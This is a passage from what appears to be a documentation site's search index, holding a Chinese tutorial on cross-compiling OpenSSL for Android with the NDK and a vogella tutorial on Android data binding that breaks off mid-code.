Android\u4e0b\u7684\u7f16\u8bd1\u548c\u4f7f\u7528"},{"location":"Android/OpenSSL%E5%AE%9E%E8%B7%B5-Android%E4%B8%8B%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E4%BD%BF%E7%94%A8/#1","text":"openssl\u53ef\u4ee5\u7f16\u8bd1\u6210ARM\u4e0b\u9762\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801\uff08\u52a8\u6001\u5e93\u6216\u8005\u9759\u6001\u5e93\uff09\uff0c\u65b9\u4fbfAPP\u4f7f\u7528\uff0cAPP\u5728\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u9700\u8981\u4f7f\u7528JNI\u6765\u8fdb\u884c\u8c03\u7528\u3002 \u5b98\u65b9WIKI\u6709\u5199\u5982\u4f55\u4e3aandroid\u7f16\u8bd1openssl\uff0c\u5730\u5740\u662f\uff1a https://wiki.openssl.org/index.php/Android \u56e0\u6b64\u4e5f\u662f\u53c2\u8003\u8fd9\u7bc7\u6587\u7ae0\u5b9e\u73b0\u7684\u3002 \u7f16\u8bd1\u4e0d\u592a\u590d\u6742\uff0c\u57fa\u672c\u6b65\u9aa4\u5982\u4e0b\uff1a \u4e0b\u8f7dNDK \u4e0b\u8f7dopenssl\u6e90\u7801\u548c\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u6240\u9700\u8981\u7684setenv-android.sh \u914d\u7f6e\u7f16\u8bd1\u53c2\u6570 \u7f16\u8bd1","title":"1. \u6982\u8ff0"},{"location":"Android/OpenSSL%E5%AE%9E%E8%B7%B5-Android%E4%B8%8B%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E4%BD%BF%E7%94%A8/#2","text":"","title":"2. \u51c6\u5907\u5de5\u4f5c"},{"location":"Android/OpenSSL%E5%AE%9E%E8%B7%B5-Android%E4%B8%8B%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E4%BD%BF%E7%94%A8/#21","text":"\u5b98\u65b9\u7ed9\u7684\u65b9\u6cd5\uff0c\u662flinux\u4e0b\u7684\uff0c\u56e0\u6b64\u8fd9\u91cc\u5efa\u8bae\u4f7f\u7528\u4e0b\u9762\u4e09\u79cd\u65b9\u5f0f\u6765\u5b9e\u73b0\u7f16\u8bd1\uff1a ubuntu\u7269\u7406\u673a\u6216\u8005\u865a\u62df\u673a windows\u4e0a\u4f7f\u7528docker\uff0c\u7136\u540e\u4f7f\u7528ubuntu/debian\u4e00\u7c7b\u7684image\u6765\u7f16\u8bd1(\u5efa\u8bae\u4f7f\u7528Android SDK/NDK\u4e00\u7c7b\u7684image\uff0c\u7701\u53bb\u73af\u5883\u90e8\u7f72\u7684\u9ebb\u70e6) windows 10\u4e0a\u9762\u4f7f\u7528WSL \u4e0a\u8ff0\u4e09\u79cd\u5176\u5b9e\u914d\u7f6e\u548c\u7f16\u8bd1\u8fc7\u7a0b\u90fd\u662f\u4e00\u81f4\u7684\uff0c\u53ea\u662f\u540e\u4e24\u8005\u65b9\u4fbf\u4f7f\u7528windows\u4e3a\u4e3b\u7684\u7528\u6237\u3002\u56e0\u6b64\u6211\u8fd9\u91cc\u7ed9\u51fa\u7684WSL\u4e0a\u7684\u914d\u7f6e\u548c\u7f16\u8bd1\u8fc7\u7a0b\uff08\u5b9e\u9645\u4e0a\u548c\u524d\u4e24\u79cd\u6ca1\u4ec0\u4e48\u533a\u522b\uff09\u3002","title":"2.1 \u73af\u5883\u51c6\u5907"},{"location":"Android/OpenSSL%E5%AE%9E%E8%B7%B5-Android%E4%B8%8B%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E4%BD%BF%E7%94%A8/#22-linuxndk","text":"\u7f16\u8bd1Openssl\u9700\u8981\u4f7f\u7528NDK\uff0c\u5148\u4e0b\u8f7dNDK\uff1a # \u5728D\u76d8\u4e0b\u5efa\u7acbNDK\u76ee\u5f55 mkdir /mnt/d/ndk cd /mnt/d/ndk wget https://dl.google.com/android/repository/android-ndk-r14b-linux-x86_64.zip \u4e0b\u8f7d\u8fd8\u662f\u633a\u5feb\u7684\uff0c\u4e0d\u9700\u8981\u7ffb\u5899\uff0c\u7f51\u901f\u6162\u7684\u670b\u53cb\u53ef\u4ee5\u4f7f\u7528\u8fc5\u96f7\u6765\u8fdb\u884c\u4e0b\u8f7d\u3002 # \u89e3\u538b unzip android-ndk-r14b-linux-x86_64.zip # \u5982\u679c\u63d0\u793aunzip\u4e3a\u65e0\u6548\u547d\u4ee4\uff0c\u53ef\u4ee5\u4f7f\u7528apt-get\u8fdb\u884c\u5b89\u88c5 sudo apt-get install unzip \u6ce8\u610f\uff1a\u8bf7\u52ff\u5728windows\u4e0b\u76f4\u63a5\u89e3\u538b\uff0c\u56e0\u4e3a\u5185\u90e8\u4f1a\u6709\u540c\u540d\u6587\u4ef6\uff08\u53ea\u662f\u5927\u5c0f\u5199\u4e0d\u540c\uff09\uff0c\u5f15\u53d1\u6587\u4ef6\u8986\u76d6 \u6700\u540e\uff1aNDK\u88ab\u89e3\u538b\u5728\uff1a D\u76d8\u7684NDK\u76ee\u5f55\u4e0b\uff0c\u4e5f\u5c31\u662f\uff1a/mnt/d/ndk/android-ndk-r14b","title":"2.2 \u5b89\u88c5linux\u7248\u672c\u7684NDK"},{"location":"Android/OpenSSL%E5%AE%9E%E8%B7%B5-Android%E4%B8%8B%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E4%BD%BF%E7%94%A8/#23-openssl","text":"# \u4e0b\u8f7d\u6e90\u7801 cd /mnt/d wget https://www.openssl.org/source/openssl-1.1.0f.tar.gz # \u89e3\u538b\u6e90\u7801 tar -zxvf openssl-1.1.0f.tar.gz #\u62c9\u53d6setenv-android.sh\uff0c\u6211\u4eec\u9700\u8981\u8fd9\u4e2a\u811a\u672c\u6765\u7ed9\u6211\u4eec\u914d\u7f6e\u73af\u5883 cd /mnt/d/openssl-1.1.0f wget https://wiki.openssl.org/images/7/70/Setenv-android.sh # \u6ce8\u610f\u8fd9\u4e2a\u6587\u4ef6\u662f\u5927\u5199\u5f00\u5934\u7684\uff0c\u6211\u4eec\u7a0d\u5fae\u4fee\u6539\u4e00\u4e0b\u540d\u79f0\uff0c\u65b9\u4fbf\u4f7f\u7528 mv Setenv-android.sh setenv-android.sh \u6700\u540e\uff0copenssl\u7684\u6e90\u7801\u6240\u5728\u4f4d\u7f6e\u662f\uff1a/mnt/d/openssl-1.1.0f","title":"2.3 \u51c6\u5907openssl\u6e90\u7801"},{"location":"Android/OpenSSL%E5%AE%9E%E8%B7%B5-Android%E4%B8%8B%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E4%BD%BF%E7%94%A8/#3","text":"\u7528\u7f16\u8f91\u5668\u7f16\u8f91\uff08\u53ef\u4ee5\u4f7f\u7528windows\u4e0b\u7684\u7f16\u8f91\u5668\uff0c\u6211\u8fd9\u91cc\u4f7f\u7528 notepad++ \uff09 setenv-android.sh \uff0c \u4fee\u6539\u4ee5\u4e0b\u53c2\u6570\uff1a _ANDROID_NDK=\"android-ndk-r9\" # \u4fee\u6539\u4e3a\uff1a _ANDROID_NDK=\"android-ndk-r14b\" # \u56e0\u4e3a\u6211\u4eec\u4f7f\u7528\u7684\u662fR14B\u8fd9\u4e2a\u7248\u672c\u7684NDK _ANDROID_EABI=\"arm-linux-androideabi-4.8\" \u4fee\u6539\u4e3aGCC 4.9 _ANDROID_EABI=\"arm-linux-androideabi-4.9\" \u6ce8\u610f\uff0c\u8fd9\u4e2a\u811a\u672c\u5728WSL\u4e0a\u6267\u884c\u53ef\u80fd\u5b58\u5728\u4e00\u4e9b\u95ee\u9898\uff0c\u6211\u4e0b\u8f7d\u4e0b\u6765\u7684\u662f\\r\\n\u6362\u884c\u7684\uff0c\u5728WSL\u4e0a\u6267\u884c\u4f1a\u62a5\u9519\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528notepad++\u6765\u66ff\u6362\u6389\\r\uff0c\u5177\u4f53\u505a\u6cd5\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u66ff\u6362\u6389\\r","title":"3. \u914d\u7f6e\u73af\u5883"},{"location":"Android/OpenSSL%E5%AE%9E%E8%B7%B5-Android%E4%B8%8B%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E4%BD%BF%E7%94%A8/#4","text":"","title":"4. \u5f00\u59cb\u7f16\u8bd1"},{"location":"Android/OpenSSL%E5%AE%9E%E8%B7%B5-Android%E4%B8%8B%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E4%BD%BF%E7%94%A8/#_1","text":"\u6211\u4eec\u9700\u8981\u901a\u8fc7\u73af\u5883\u53d8\u91cf\u6765\u6307\u5b9aNDK\u6240\u5728\u7684\u4f4d\u7f6e\uff0c\u6309\u7167\u4e4b\u524d\u7684\u5b89\u88c5\u4f4d\u7f6e\uff0c\u6211\u4eec\u53ea\u9700\u8981\u6267\u884c\uff1a export ANDROID_NDK_ROOT=/mnt/d/ndk/android-ndk-r14b source ./setenv-android.sh # \u8f93\u51fa ANDROID_NDK_ROOT: /mnt/d/ndk/android-ndk-r14b ANDROID_ARCH: arch-arm ANDROID_EABI: arm-linux-androideabi-4.9 ANDROID_API: android-18 ANDROID_SYSROOT: /mnt/d/ndk/android-ndk-r14b/platforms/android-18/arch-arm ANDROID_TOOLCHAIN: /mnt/d/ndk/android-ndk-r14b/toolchains/arm-linux-androideabi-4.9/prebuilt/linux-x86_64/bin FIPS_SIG: /mnt/d/openssl-1.1.0f/util/incore CROSS_COMPILE: arm-linux-androideabi- ANDROID_DEV: /mnt/d/ndk/android-ndk-r14b/platforms/android-18/arch-arm/usr \u6ce8\u610f\uff0c\u8fd9\u4e00\u6b65\u4e4b\u540e\uff0c\u8bf7\u52ff\u5173\u95edcmd/\u7ec8\u7aef\u7a97\u53e3\uff0c\u56e0\u4e3a\u7f16\u8bd1\u5668\u7b49\u53c2\u6570\u662f\u901a\u8fc7\u73af\u5883\u53d8\u91cf\u4f20\u9012\u7ed9make\u7684","title":"\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf"},{"location":"Android/OpenSSL%E5%AE%9E%E8%B7%B5-Android%E4%B8%8B%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E4%BD%BF%E7%94%A8/#_2","text":"mkdir /mnt/d/openssl-output","title":"\u521b\u5efa\u8f93\u51fa\u76ee\u5f55"},{"location":"Android/OpenSSL%E5%AE%9E%E8%B7%B5-Android%E4%B8%8B%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E4%BD%BF%E7%94%A8/#_3","text":"# \u914d\u7f6eopenssl ./config no-shared no-ssl2 no-ssl3 no-comp no-hw no-engine \\ --openssldir=/mnt/d/openssl-output/$ANDROID_API --prefix=/mnt/d/openssl-output/$ANDROID_API #\u7f16\u8bd1 make depend make all -j8 # -j8 \u8868\u793a\u5e76\u53d1\u7684\u7f16\u8bd1\"\u7ebf\u7a0b\u6570\"\uff0c\u5efa\u8bae\u8bbe\u7f6e\u6210CPU\u7ebf\u7a0b\u6570\u4e00\u81f4 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cno-shared\u8868\u793a\u4e0d\u7f16\u8bd1\u52a8\u6001\u5e93\uff0c\u8fd9\u6837\u7f16\u8bd1\u51fa\u6765\u7684openssl\u547d\u4ee4\uff0c\u4e0d\u4f9d\u8d56\u52a8\u6001\u5e93\uff0c\u540c\u65f6\u4e5f\u6ca1\u6709so\u4ea7\u751f\u3002\u66f4\u591a\u7684\u7f16\u8bd1\u53c2\u6570\uff0c\u8be6\u89c1\u6e90\u7801\u76ee\u5f55\u4e0b\u7684\uff1aINSTALL\uff08\u8be5\u6587\u4ef6\u6ca1\u6709\u540e\u7f00\uff09","title":"\u914d\u7f6e\u548c\u7f16\u8bd1"},{"location":"Android/OpenSSL%E5%AE%9E%E8%B7%B5-Android%E4%B8%8B%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E4%BD%BF%E7%94%A8/#_4","text":"make install \u6267\u884c\u5b8c\u4e0a\u9762\u7684\u547d\u4ee4\uff0copenssl\u7684\u5934\u6587\u4ef6\u3001\u5e93\u6587\u4ef6\u3001\u6587\u6863\u4ee5\u53ca\u547d\u4ee4\u5c31\u88ab\u590d\u5236\u5728\uff1a /mnt/d/openssl-output \u76ee\u5f55\u91cc\u4e86\u3002 \u76ee\u5f55\u4e3b\u8981\u7ed3\u6784\u662f\uff1a bin \u5b58\u653eopenssl\u547d\u4ee4 include \u5934\u6587\u4ef6 lib \u5e93\u6587\u4ef6 share \u6587\u6863\u4e00\u7c7b\u7684","title":"\u5b89\u88c5"},{"location":"Android/OpenSSL%E5%AE%9E%E8%B7%B5-Android%E4%B8%8B%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E4%BD%BF%E7%94%A8/#5-app","text":"\u65b0\u5efa\u4e00\u4e2a\u6d4b\u8bd5APP\uff0c\u5e76\u52fe\u9009 include C++ support \u628ainclude\u4e0b\u7684openssl\u76ee\u5f55\uff0c\u6574\u4e2a\u590d\u5236\u5230\u9879\u76eesrc\u4e0b\u7684cpp\u5b50\u76ee\u5f55 \u628alib\u4e0b\u7684 libcrypto.a \u548c libssl.a \u590d\u5236\u5230src->cpp->libs\u5b50\u76ee\u5f55 \u6700\u7ec8\u76ee\u5f55\u7ed3\u6784\u5982\u4e0b\uff1a \u251c\u2500androidTest \u2502 \u2514\u2500java \u2502 \u2514\u2500com \u2502 \u2514\u2500example \u2502 \u2514\u2500summer \u2502 \u2514\u2500myapplication \u251c\u2500main \u2502 \u251c\u2500cpp \u2502 \u2502 \u251c\u2500libs \u2502 \u2502 \u2514\u2500openssl \u2502 \u251c\u2500java \u2502 \u2502 \u2514\u2500com \u2502 \u2502 \u2514\u2500example \u2502 \u2502 \u2514\u2500summer \u4fee\u6539CMakeLists.txt\uff0c\u5728 cmake_minimum_required(VERSION 3.4.1) \u540e\u9762\u52a0\uff1a # \u8868\u793a\u628asrc/main/cpp\u52a0\u5165include\u76ee\u5f55\uff0c\u8fd9\u6837\u5728\u4ee3\u7801\u4e2d\uff0c\u4f7f\u7528\uff1a#include <...>\u5c31\u80fd\u8bbf\u95ee\u5230\u5934\u6587\u4ef6 include_directories(src/main/cpp) # \u6dfb\u52a0\u4e24\u4e2a\u9884\u7f16\u8bd1\u5e93 add_library(openssl-crypto STATIC IMPORTED) set_target_properties(openssl-crypto PROPERTIES IMPORTED_LOCATION ${CMAKE_SOURCE_DIR}/src/main/cpp/libs/libcrypto.a ) add_library(openssl-ssl STATIC IMPORTED) set_target_properties(openssl-ssl PROPERTIES IMPORTED_LOCATION ${CMAKE_SOURCE_DIR}/src/main/cpp/libs/libssl.a ) \u628a\u6700\u540e\u7684\uff1a target_link_libraries( # Specifies the target library. native-lib # Links the target library to the log library # included in the NDK. ${log-lib}) \u4fee\u6539\u6210\uff1a target_link_libraries( # Specifies the target library. native-lib # Links the target library to the log library # included in the NDK. ${log-lib} openssl-ssl openssl-crypto) \u4fee\u6539app\u76ee\u5f55\u4e0b\u7684\uff1abuild.gradle android { compileSdkVersion 25 buildToolsVersion \"26.0.0\" defaultConfig { applicationId \"com.example.summer.myapplication\" minSdkVersion 15 targetSdkVersion 25 versionCode 1 versionName \"1.0\" testInstrumentationRunner \"android.support.test.runner.AndroidJUnitRunner\" externalNativeBuild { cmake { cppFlags \"-std=c++11 -frtti -fexceptions\" // \u4e0b\u9762\u8fd9\u6837\u662f\u589e\u52a0\u7684 arguments \"-DANDROID_ABI=armeabi-v7a\" } } } buildTypes { release { minifyEnabled false proguardFiles getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro' } } externalNativeBuild { cmake { path \"CMakeLists.txt\" } } } \u5b9e\u9645\u4e0a\u589e\u52a0\u7684\u53ea\u662f\u4e00\u884c\u4ee3\u7801\uff1a arguments \"-DANDROID_ABI=armeabi-v7a\" \u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cgradle\u4f1a\u901a\u8fc7\u591a\u6b21\u8c03\u7528\uff0c\u901a\u8fc7\u4f20\u9012 ABI \u7c7b\u578b\u6765\u8ba9cmake\u4ea7\u751f\u5404\u4e2a ABI \u4e0b nija \u6784\u5efa\u811a\u672c\uff0c\u4ece\u800c\u7f16\u8bd1\u51fa\u5404\u4e2a ABI \u4e0b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u56e0\u4e3aopenssl\u9ed8\u8ba4\u7f16\u8bd1\u51fa\u6765\u7684\u53ea\u6709 armeabi-v7a \u7684\uff0c\u56e0\u6b64\u6211\u4eec\u7559\u4e0b\u8fd9\u4e2a ABI \u5c31\u884c\u4e86\u3002 \u4fee\u6539native-lib.cpp \u5728\u7b2c\u4e00\u884c\u589e\u52a0\uff1a #include \"openssl/crypto.h\" \u4e0b\u9762\u7684\u4ee3\u7801\u66ff\u6362\u4e00\u4e0b\uff1a std::string hello = \"Hello from C++\"; return env->NewStringUTF(hello.c_str()); \u66ff\u6362\u4e3a\uff1a return env->NewStringUTF(OpenSSL_version(OPENSSL_VERSION)); \u542f\u52a8APP \u7f16\u8bd1\u4e4b\u540e\uff0c\u5982\u65e0\u610f\u5916\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728\u624b\u673a\u4e0a\u8fd0\u884c\u4e86\uff0c\u4f1a\u5230\u770b\u4e3b\u754c\u9762\u4e0a\u8f93\u5165openssl\u7684\u7248\u672c\u4fe1\u606f\uff1a openssl test app","title":"5. \u6d4b\u8bd5APP"},{"location":"Android/OpenSSL%E5%AE%9E%E8%B7%B5-Android%E4%B8%8B%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E4%BD%BF%E7%94%A8/#6","text":"\u7f16\u8bd1\u5668\u517c\u5bb9\u6027 \u7ec6\u5fc3\u7684\u670b\u53cb\u53ef\u80fd\u53d1\u73b0\u4e86\uff0c\u6211\u7f16\u8bd1\u7684\u65f6\u5019\u4f7f\u7528\u7684\u662fGCC 4.9\uff0c\u800cAPP\u5728\u94fe\u63a5\u7684\u65f6\u5019\uff0c\u9ed8\u8ba4\u4f7f\u7528\u4e86CLANG\uff0c\u5728google\u7684\u6587\u6863\u91cc\uff0cGCC\u5df2\u7ecf\u662f\u4e0d\u63a8\u8350\u7684\u5de5\u5177\u94fe\u4e86\uff08\u8be6\u89c1\uff1a https://developer.android.com/ndk/guides/cmake.html \uff09 \uff0c \u81f3\u4e8e\u4e24\u8005\u7684ABI\u517c\u5bb9\u6027\uff0c\u6211\u4e5f\u6ca1\u53d1\u73b0\u4e00\u4e2a\u6bd4\u8f83\u6743\u5a01\u7684\u7b54\u6848\uff0c\u53ef\u4ee5\u770b\u770b\u8fd9\u7bc7\u8ba8\u8bba\uff1a https://stackoverflow.com/questions/20875924/can-clang-compile-code-with-gcc-compiled-a-libs \u9274\u4e8eC++\u7684\u590d\u6742\u6027\uff0c\u5efa\u8baeC++\u4e0d\u8981\u8fd9\u6837\u505a\u3002 \u53ef\u4ee5\u5728build.gradle\u91cc\u9762\u8bbe\u7f6e\u6210GCC\u7f16\u8bd1\uff0c\u8fd9\u6837\u5de5\u5177\u94fe\u5c31\u4e00\u81f4\u4e86\u3002 android\u7684abi \u76ee\u524d\u9ed8\u8ba4\u6784\u5efa\u51fa\u6765\u7684\u662farmea-v7a\u7684\uff0c\u57fa\u672c\u4e0a\u5927\u90e8\u5206CPU\u90fd\u662f\u8fd9\u4e2a\u7c7b\u578b\u4e86\u3002\u800c\u76ee\u524d\u8fd9\u4e2a\u811a\u672c\u4e0d\u80fd\u76f4\u63a5\u6784\u5efa\u51fa64\u4f4d\u7684arm64-v8a\uff0c\u6709\u9700\u8981\u7684\u670b\u53cb\uff0c\u53ef\u4ee5\u53c2\u8003\uff1a http://doc.qt.io/qt-5/opensslsupport.html \u3002 \u81f3\u4e8eX86\uff0c\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\uff1a setenv-android.sh \u91cc\u9762\u7684\uff1a _ANDROID_ARCH=arch-x86 \u6765\u5b9e\u73b0\u3002\u81f3\u4e8eMIPS\u76ee\u524d\u4e0d\u80fd\u76f4\u63a5\u7f16\u8bd1\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://www.jianshu.com/p/b790c548e787","title":"6. \u5176\u4ed6"},{"location":"Android/Using%20data%20binding%20in%20Android/","text":"This tutorial describes the usage of data binding in Android applications. Data binding allows to synchronize your user interface with your application model and logic. 1. Using data binding in Android applications 1.1. Introduction to data binding in Android Android offers support to write declarative layouts using data binding. This minimizes the necessary code in your application logic to connect to the user interface elements. The usage of data binding requires changes in your layout files. Such layout files starts with a layout root tag followed by a data element and a view root element. The data elements describe data which is available for binding. This view element contains your root hierarchy similar to layout files which are not used with data binding. References to the data elements or expressions within the layout are written in the attribute properties using the @{} or @={} , <?xml version=\"1.0\" encoding=\"utf-8\"?> <layout xmlns:android=\"http://schemas.android.com/apk/res/android\"> <data> <variable name=\"temp\" type=\"com.vogella.android.databinding.TemperatureData\"/> **(1)** </data> <LinearLayout **(2)** android:orientation=\"vertical\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\"> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:text=\"@{temp.location}\"/> <TextView android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" android:text=\"@{temp.celsius}\"/> </LinearLayout> </layout> 1 The user variable within data describes a property that may be used within this layout. 2 Normal view hierarchy Android data binding generates a Binding class based on this layout. This class holds all the bindings from the layout properties, i.e., the defined variable to the corresponding views. It also provides generated setters for your data elements from the layout. The name of the generated class is based on the name of the layout file. This name is converted to Pascal case and the Binding suffix is added to it. For example, if the layout file is called activity_main.xml , the generate class is called ActivityMainBinding . You can inflate the layout and connect your model via this class or the DataBindingUtil class. TemperatureData temperatureData = // your data is created here ActivityMainBinding binding = DataBindingUtil.setContentView(this, R.layout.activity_main); binding.setTemp(temperatureData); // generated setter based on the data in the layout file You can use the inflate method on the generated class. This is useful for using data binding in fragments, ListView or RecyclerView . ActivityMainBinding binding = ActivityMainBinding.inflate(getLayoutInflater(), container, attachToContainer); // get the root view View view = binding.getRoot(); // do more stuff TemperatureData temperatureData = // your data is created here binding.setTemp(temperatureData); // generated setter based on the data in the layout file You can also inflate layouts for RecyclerView , ViewPager , or other things that aren\u2019t setting the Activity contents. 1.2. Enable data binding in your Android application To enable the usage of data binding in your Android application, add the following snippet to the app/build.gradle file. android { .... dataBinding { enabled = true } } 1.3. Data binding for events via listener bindings and method references Events may be bound to handler methods directly, similar to the way android:onClick can be assigned to a method in the activity. Event attribute names are governed by the name of the listener method with a few exceptions. For example, View.OnLongClickListener has a method onLongClick() , so the attribute for this event is android:onLongClick . To assign an event to its handler, use a normal binding expression, with the value being the method name to call. The binding expression can assign the click listener for a View. <?xml version=\"1.0\" encoding=\"utf-8\"?> <layout xmlns:android=\"http://schemas.android.com/apk/res/android\"> <data> <variable name=\"presenter\" type=\"com.vogella.android.databinding.MainActivityPresenter\"/> </data> <Button android:text=\"Start second activity\" android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:onClick=\"@{() -> presenter.showList()}\" /> </layout> You could also bind to a method reference via android:onClick=\"@{handlers::onClickFriend}\"/> . If you methods need parameters, you can also pass your data object to them. For example: android:onClick=\"@{(theView) -> presenter.onSaveClick(theView, task)}\" 1.4. Imports You can also import classes to use them in your data binding expressions. <data> <import type=\"com.example.MyStringUtils\"/> <variable name=\"user\" type=\"com.example.User\"/> </data> <TextView android:text=\"@{MyStringUtils.capitalize(user.lastName)}\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\"/> 1.5. Updating the user interfaces with changes from the data model Any plain old Java object (POJO) can be used for data binding. But if updates in the data model should also update the user interface, the objects must be able to notify about data changes. There are three different data change notification mechanisms: * observable objects * observable fields * observable collections Android provides the BaseObservable class which you can extend. The data class is responsible for notifying when the properties change. This is done by assigning a @Bindable annotation to the getter and notifying in the setter. package com.vogella.android.databinding; import android.databinding.BaseObservable; import android.databinding.Bindable; import java.util.Observable; public class TemperatureData extends BaseObservable { private String celsius; public TemperatureData(String celsius) { this.celsius = celsius; } @Bindable **(1)** public String getCelsius() { return celsius; } public void setCelsius(String celsius) { this.celsius = celsius; notifyPropertyChanged(BR.celsius); **(2)** } } 1 Define a relevant getter 2 Notify any listeners, BR.celsius is a generated class This listener is invoked on every update and it updates the corresponding views. This ensures that updates in the model updates also the UI. Alternatively to create a observable class, you can also use ObservableField and its subclass for properties. private class TemperatureData { public final ObservableField<String> celsius = new ObservableField<>(); public final ObservableField<String> location = new ObservableField<>(); } To access such fields in your code, use the set and get methods. temp.location.set(\"Hamburg\"); String celsius = temp.celsius.get(); 1.6. Custom converters with BindingAdapter Sometimes you have to perform complex data conversions. For this, you can register a custom converter via the static @BindingAdapter method. This method can be placed anywhere in your code and can override the default conversion of a field to your data model. For example, assume that you want to assign a field of your data model to an image view. <ImageView android:id=\"@+id/icon\" android:layout_width=\"40dp\" android:layout_height=\"fill_parent\" android:layout_alignParentBottom=\"true\" android:layout_alignParentTop=\"true\" android:layout_marginRight=\"6dip\" android:contentDescription=\"TODO\" android:src=\"@{obj.url}\" /> You can register for this property on ImageView with the following method. This method uses Glide to download the image. @BindingAdapter(\"android:src\") public static void setImageUrl(ImageView view, String url) { Glide.with(view.getContext()).load(url).into(view); } googletag.cmd.push(function() { googletag.display('ad-inBetween01'); }); 2. Exercise: Using data binding in Android applications In this exercise you learn how to interact between your user interface widgets using data binding. Create a new Android application for this exercise, with the com.vogella.android.databinding top level package. Use the Empty template for this purpose. 2.1. Activate the usage of data binding Open your app/build.gradle file and activate the usage of data binding. apply plugin: 'com.android.application' android { dataBinding { enabled = true } .... [REST AS BEFORE...] Ensure you pick the correct build file. This setting must be done in the build.gradle file of your app. 2.2. Create classes for the view interaction Create the following classes. package com.vogella.android.databinding; import android.databinding.BaseObservable; import android.databinding.Bindable; public class TemperatureData extends BaseObservable { private String location; private String celsius; public TemperatureData(String location, String celsius) { this.location = location; this.celsius = celsius; } @Bindable public String getCelsius() { return celsius; } @Bindable public String getLocation() { return location; } public void setLocation(String location){ this.location = location; notifyPropertyChanged(BR.location); } public void setCelsius(String celsius) { this.celsius = celsius; notifyPropertyChanged(BR.celsius); } } The BR class is not yet generated. After the definition of the layout file, the is will be generated by the Gradle tooling. package com.vogella.android.databinding; public interface MainActivityContract { public interface Presenter { void onShowData(TemperatureData temperatureData); } public interface View { void showData(TemperatureData temperatureData); } } package com.vogella.android.databinding; import android.content.Context; public class MainActivityPresenter implements MainActivityContract.Presenter { private MainActivityContract.View view; private Context ctx; public MainActivityPresenter(MainActivityContract.View view, Context ctx) { this.view = view; this.ctx = ctx; } @Override public void onShowData(TemperatureData temperatureData) { view.showData(temperatureData); } } 2.3. Adjust layout file and activity to use data binding Change the layout to the following. <?xml version=\"1.0\" encoding=\"utf-8\"?> <layout xmlns:android=\"http://schemas.android.com/apk/res/android\"> <data> <variable name=\"temp\" type=\"com.vogella.android.databinding.TemperatureData\" /> <variable name=\"presenter\" type=\"com.vogella.android.databinding.MainActivityPresenter\"/> </data> <LinearLayout android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:orientation=\"vertical\" > <TextView android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:text=\"@={temp.location}\" /> <TextView android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:text=\"@={temp.celsius}\" /> <EditText android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:layout_marginTop=\"8dp\" android:text=\"@={temp.celsius}\" /> <Button android:text=\"Show data model\" android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:onClick=\"@{() -> presenter.onShowData(temp)}\" android:id=\"@+id/button\" /> </LinearLayout> </layout> You see some warning messages in the editor, e.g., because you used hard-codes strings. For this exercise, we ignore these warnings. Adjust your activity code to use the generated data binding classes. package com.vogella.android.databinding; import android.app.Activity; import android.content.Intent; import android.databinding.DataBindingUtil; import android.os.Bundle; import android.widget.Toast; import com.vogella.android.databinding.databinding.ActivityMainBinding; public class MainActivity extends Activity implements MainActivityContract.View { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); ActivityMainBinding binding = DataBindingUtil.setContentView(this, R.layout.activity_main); MainActivityPresenter mainActivityPresenter = new MainActivityPresenter(this, getApplicationContext()); TemperatureData temperatureData = new TemperatureData(\"Hamburg\", \"10\"); binding.setTemp(temperatureData); binding.setPresenter(mainActivityPresenter); } @Override public void showData(TemperatureData temperatureData) { String celsius = temperatureData.getCelsius(); Toast.makeText(this, celsius, Toast.LENGTH_SHORT).show(); } } 2.4. Convince Android Studio to compile your application If the BR class is missing, select Build Clean followed by Build Make Project . 2.5. Validate your application Start your application. If you press the button, a small popup should be shown with the correct data. The first text view should The second TextView should update automatically, if you type in the EditText field. 3. Exercise: Using data binding for RecyclerView In this exercise you learn how to use data binding for a recyclerview. Continue to use the com.vogella.android.databinding package. 3.1. Define a new activity and allow to start it Create a new activity called SecondActivity . Ensure that you add it to your Android manifest. Adjust your MVP contract to start the second activity. package com.vogella.android.databinding; public interface MainActivityContract { public interface Presenter { void onShowData(TemperatureData temperatureData); void showList(); } public interface View { void showData(TemperatureData temperatureData); } } Implement this new behavior in MainActivityPresenter to start the second activity. package com.vogella.android.databinding; import android.content.Context; import android.content.Intent; public class MainActivityPresenter implements MainActivityContract.Presenter { private MainActivityContract.View view; private Context ctx; public MainActivityPresenter(MainActivityContract.View view, Context ctx) { this.view = view; this.ctx = ctx; } @Override public void onShowData(TemperatureData temperatureData) { view.showData(temperatureData); } @Override public void showList() { Intent i = new Intent(ctx, 